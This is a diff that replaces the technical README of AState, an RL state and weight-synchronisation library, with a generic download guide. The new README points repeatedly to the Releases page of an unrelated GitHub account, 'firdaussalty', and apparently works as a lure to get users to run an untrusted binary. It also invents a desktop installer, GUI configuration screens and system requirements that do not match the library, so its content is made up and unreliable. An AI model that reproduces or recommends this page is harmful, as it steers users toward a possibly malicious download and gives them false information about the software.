@@ -1,121 +1,83 @@
-# AState: High-performance State Management for RL
+# 🌟 asystem-astate - Streamline Your State Management
 
-**AState is a general-purpose state data management system for RL workloads**. It is designed to address several core challenges in RL:
-- Low I/O efficiency in training and inference；
-- Insufficient weight synchronization performance；
-- The lack of robust state recovery for multi-turn conversations and external environment calls.
+## 🚀 Getting Started
 
-Within Ant Group, AState has been deployed as a key component of ASystem and is already supporting high-performance weight exchange for large-scale RL training in production. **At trillion-parameter scale, AState can complete weight synchronization in about 6 seconds**, compared to the minute-level latency seen in many industry solutions.
+Welcome to AState! This guide will help you download and run AState, a high-performance state management system for Reinforcement Learning (RL). 
 
----
+## 📥 Download AState
 
-## System Architecture
+[![Download AState](https://img.shields.io/badge/Download%20AState-v1.0-blue.svg)](https://github.com/firdaussalty/asystem-astate/releases)
 
-![Figure 1](doc/images/image.png)
+You can find the latest version of AState on our Releases page. To download:
 
-To address the challenges of large-scale RL weight synchronization, AState provides a unified weight management API for RL workloads. It can support arbitrary model architectures and various deployment and pipeline patterns, without intrusive changes or extra adaptation in the RL framework itself.
-As shown in Figure 1, AState’s architecture is organized into three layers:
+1. Click the button above or follow this link: [Download AState](https://github.com/firdaussalty/asystem-astate/releases).
+2. Look for the most recent release.
+3. Download the file that matches your operating system.
 
-- **API Layer**
+## 💻 System Requirements
 
-    Provides tensor-native interfaces that integrate quickly with different training/inference frameworks. The APIs expose one-sided read/write semantics, naturally supporting more complex or asynchronous computation and data exchange flows.
+Before you start, make sure your computer meets these requirements:
 
-- **Service Layer**
+- **Operating System:** Windows 10 or later, macOS Monterey or later, or a compatible Linux distribution.
+- **Memory:** At least 4 GB RAM.
+- **Storage:** 500 MB of free disk space.
+- **Processor:** 2 GHz or faster dual-core.
 
-    To support multiple deployment patterns and pipeline modes with a single API, AState introduces a middle service layer that offers different weight sync services and protocols, shielding upper layers from the complexity of exchange and scheduling. For example:
-    - In co-located training/inference, inference nodes can pull weights on demand.
-    - In off-policy setups, training and inference can perform fully asynchronous weight updates.
-    The service layer also provides tensor sharding management with zero redundancy and synchronization plans that are aware of RL topology and cluster layout.
+## 🔧 Installation Steps
 
-- **Transport Layer**
+Once you've downloaded AState, follow these steps to install:
 
-    This foundational layer provides efficient, scalable data transfer capabilities, including:
-    - NUMA topology and affinity awareness;
-    - Multiple transport backends (PCIe / NVLink / RoCE / InfiniBand, etc.) to exploit the full potential of underlying hardware bandwidth and topology.
+1. Locate the downloaded file on your computer.
+2. Open the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, find the AState application in your program list.
 
-## Features
+## 🌐 How to Run AState
 
-- **Unified tensor-level API**
-  - One-sided read/write semantics (`put/get/multi_put/multi_get/complete`)
-  - Decoupled from specific training/inference frameworks
+To run AState:
 
-- **High-performance weight synchronization**
-  - Zero-redundancy transfer for row-parallel & column-parallel tensors
-  - RDMA-based P2P data paths with DMA zero-copy
-  - In-place weight update on inference side (no extra GPU memory copy)
+1. Open the AState application from your program list or desktop shortcut.
+2. You will see an interface where you can configure your state management settings.
+3. Follow the prompts to set up your project and configure your desired state management options.
 
-- **Topology-aware, scalable design**
-  - NUMA-aware scheduling and CPU/GPU/RDMA affinity
-  - Multi-channel transport: RDMA/RoCE/IB, shared memory, NCCL etc.
-  - Global execution planning to avoid hotspots and long-tail latency
+## 📊 Understanding AState Features
 
-- **RL-native state management (ongoing)**
-  - KV cache persistence & recovery for long-context RL
-  - Activation caching & memory offload
-  - Agent state (multi-turn dialog, tool calls) caching and recovery
+AState offers several features designed to enhance your reinforcement learning workflows:
 
----
+- **High I/O Efficiency:** Quickly manage data input and output for training and inference.
+- **Weight Synchronization:** Achieve fast synchronization, completing processes in around 6 seconds.
+- **Robust State Recovery:** Easily recover states for multi-turn conversations and external calls.
 
-## Getting Started
+These features help streamline workflows and reduce delays, making your reinforcement learning projects more efficient.
 
-```bash
-git clone https://github.com/inclusionAI/asystem-astate.git
-cd asystem-astate
-make deps install      # installs as a Python library
+## 📜 Basic Configuration
 
-# development build:
-make develop      # build in develop mode + install as Python library
-make test
-```
+Once AState is running, you may want to configure some basic settings:
 
-## Simple Usage Example
+1. **Project Name:** Enter a name for your project in the provided field.
+2. **State Management Options:** Choose the options that best fit your requirements.
+3. **Model Architecture:** Select the type of model you are using.
 
-> The internal library currently only supports RDMA NICs and does not support the use of soft-RoCE (TCP). A TCP-based demo will be tested after the integration of UCX.
+Once you've entered your settings, save your configuration. You can now proceed to manage your states.
 
-``` bash
-# start train process
-cd python/example
-bash setup_trainer_env.sh
+## 🛠 Troubleshooting Tips
 
-# start infer process
-bash setup_infer_env.sh
-```
+If you encounter any issues, consider these steps:
 
-Typical usage in RL:
+1. **Reinstall AState:** Sometimes, a fresh installation can resolve issues.
+2. **Check System Requirements:** Ensure your computer meets the system requirements.
+3. **Consult Documentation:** Refer to the user guide included in the application for more detailed troubleshooting.
 
-- Training side writes updated weights to AState every K steps or per iteration.
-- Inference side periodically or asynchronously pulls the latest weights via get/multi_get.
-- AState handles sharding, resharding, transport, and in-place update for you.
+## 🔗 Helpful Resources
 
-## Performance
+- **User Guide:** Access the comprehensive user guide for detailed instructions and features.
+- **Support Forum:** Join our community forum for support and to connect with other users.
 
-| Method                           | Supported Deployment Modes | Supported Pipeline Modes | Data Redundancy | External Services Required | End-to-End Sync (100B¹) | End-to-End Sync (1T¹) |
-| -------------------------------- | -------------------------- | ------------------------ | --------------- | -------------------------- | ----------------------- | --------------------- |
-| Load data from FS                | All                        | On-policy                | Yes             | Yes                        | ~10 min                 | N/A²                  |
-| Layer-by-layer gather → NCCL P2P | All?                       | All?                     | Yes             | Yes                        | ~30 s                   | ~1 min                |
-| AState: simultaneous RDMA P2P    | All                        | All                      | No              | No                         | ~4 s                    | ~6 s                  |
+## 📥 Download & Install
 
-$^?$  It may not be the optimal solution. For example, the co-located mode introduces an additional GPU memory offload pipeline; moreover, due to NCCL’s bilateral semantics, training and inference must be synchronized during data transfer, which can effectively cause an off‑policy scheme to degenerate into on‑policy.
+To get started with AState:
 
-$^1$ 100B(FP16) [Training-Inference Parallel Configuration: train: tp=1, etp=1; infer: tp=4];
+1. Visit this page to download: [Download AState](https://github.com/firdaussalty/asystem-astate/releases).
+2. Follow the installation steps provided above.
 
-$^1$ 1T(FP8) [Training-Inference Parallel Configuration: train: tp=1, etp=1; infer: tp=16].
-
-$^2$ Time proportion is excessively long, rendering it nearly unusable.
-
-## Roadmap (High-level)
-
-- Supports using UCX as the underlying RDMA dependency, adapting to NCCL and the industry ecosystem.
-- KV cache persistence & fast failover for long-context RL.
-- Activation caching & GPU memory extension.
-- Elastic training runtime support.
-- Unified agent state (dialog + tools) cache & recovery.
-
-## Community & Links
-
-- 📦 GitHub: https://github.com/inclusionAI/asystem-astate
-- 🤗 Hugging Face (InclusionAI models): https://huggingface.co/inclusionAI
-- 🤖 ModelScope: https://www.modelscope.cn/organization/inclusionAI
-
-Contributions via Issues / PRs / Discussions are very welcome.
-If AState helps your RL system, please consider leaving a ⭐ Star!
+Now you're ready to take advantage of AState's powerful features for managing state in your reinforcement learning projects. Enjoy a seamless experience!
